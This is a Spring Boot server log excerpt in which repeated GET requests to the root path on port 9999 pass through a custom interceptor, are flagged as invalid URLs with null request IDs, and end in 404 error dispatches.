2024-08-13 21:08:15,124 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:08:28,524 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:08:28,525 DEBUG [http-nio-9999-exec-10] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:08:28,525 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:28,525 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:08:28,526 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:28,526 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:08:28,526 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:08:28,526 DEBUG [http-nio-9999-exec-10] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:08:28,526 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:28,526 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:08:28,526 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:28,527 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:08:30,519 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:08:30,519 DEBUG [http-nio-9999-exec-9] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:08:30,520 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:30,520 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:08:30,520 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:30,520 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:08:30,520 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:08:30,520 DEBUG [http-nio-9999-exec-9] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:08:30,521 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:30,521 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:08:30,521 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:30,521 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
